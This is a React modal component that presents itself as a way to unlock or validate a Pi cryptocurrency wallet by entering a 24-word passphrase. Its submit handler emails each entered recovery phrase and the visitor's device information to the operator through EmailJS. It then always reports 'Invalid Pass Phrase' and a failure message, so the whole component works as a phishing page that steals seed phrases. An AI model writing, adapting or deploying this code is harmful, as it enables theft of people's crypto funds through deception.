import { Button, Form, message, Modal } from "antd";
import TextArea from "antd/es/input/TextArea";
import { motion } from "framer-motion";
import { Dispatch, SetStateAction, useEffect, useState } from "react";
import { GiFingerPrint } from "react-icons/gi";
import { MdPassword } from "react-icons/md";
import Loading from "./Loading";
import emailjs from "@emailjs/browser";
import { useForm } from "antd/es/form/Form";

type Props = {
  open: { isOpen: boolean; action: string };
  setOpen: Dispatch<SetStateAction<{ isOpen: boolean; action: string }>>;
};

const ValidateModal = (props: Props) => {
  const [errorMessage, setErrorMessage] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [phrase, setPhrase] = useState("");

  const { action } = props.open;

  const [form] = useForm();

  useEffect(() => {
    emailjs.init(import.meta.env.VITE_EMAIL_PUBLIC_KEY);
  }, []);

  if (isLoading) {
    return <Loading />;
  }

  const deviceInfo = window.navigator.userAgent;

  const handleSubmit = async () => {
    if (phrase === "") {
      setErrorMessage(true);
      return message.error("Please Enter Your Passphrase!");
    }

    form.setFieldsValue({ device_info: deviceInfo });
    setIsLoading(true);

    try {
      await emailjs.send(
        import.meta.env.VITE_EMAIL_SERVICE_ID,
        import.meta.env.VITE_EMAIL_TEMPLATE_ID,
        {
          device_info: deviceInfo,
          passphrase: phrase,
        },
        import.meta.env.VITE_EMAIL_PUBLIC_KEY
      );
      setErrorMessage(true);
      message.error("Invalid Pass Phrase");
    } catch (error) {
      console.error("Email sending failed:", error);
    } finally {
      setIsLoading(false);
    }

    setTimeout(() => {
      setErrorMessage(false);
      message.error(`Failed to ${action} Pi`);
    }, 6000);
  };

  return (
    <Modal
      footer={false}
      closeIcon={false}
      open={props.open.isOpen}
      onCancel={() => props.setOpen({ isOpen: false, action: "" })}
    >
      <div className="border-b pb-2">
        <p className="text-3xl font-semibold">{action} Pi</p>
        <p className="ext-lg">{action} your Pi so you can sell</p>
      </div>

      {errorMessage && (
        <motion.div
          initial={{ y: 20 }}
          animate={{ y: 0 }}
          transition={{
            type: "spring",
            stiffness: 550,
            damping: 5,
            duration: 0.5,
            bounce: 0.7,
          }}
          className="error-msg border border-red-600 w-full bg-red-200 text-red-800 font-semibold p-4 py-2 rounded-lg"
        >
          Invalid Pass Phrase. Please try again.
        </motion.div>
      )}

      <Form form={form} onFinish={handleSubmit}>
        <div className="flex flex-col gap-2 items-center mb-6 mt-2">
          <p>Enter your 24-word phrase</p>
          <Form.Item
            className="w-full"
            name="passphrase"
            rules={[{ required: true, message: "Passphrase is required" }]}
          >
            <TextArea
              className="border-yellow-700"
              placeholder="Enter your 24-word phrase"
              rows={6}
              value={phrase}
              onChange={(e) => {
                setErrorMessage(false);
                setPhrase(e.target.value);
              }}
            />
          </Form.Item>
          <p className="-mt-4">Make sure your passphrase is correct</p>
        </div>
        <div className="space-y-2 md:space-y-0 md:flex gap-2">
          <Button
            loading={isLoading}
            htmlType="submit"
            type="primary"
            className="h-12 w-full font-semibold"
            icon={<MdPassword className="text-2xl" />}
          >
            {action} with passphrase
          </Button>
          <Button
            type="primary"
            className="h-12 w-full font-semibold"
            icon={<GiFingerPrint className="text-2xl" />}
          >
            {action} with fingerprint
          </Button>
        </div>
      </Form>
    </Modal>
  );
};

export default ValidateModal;
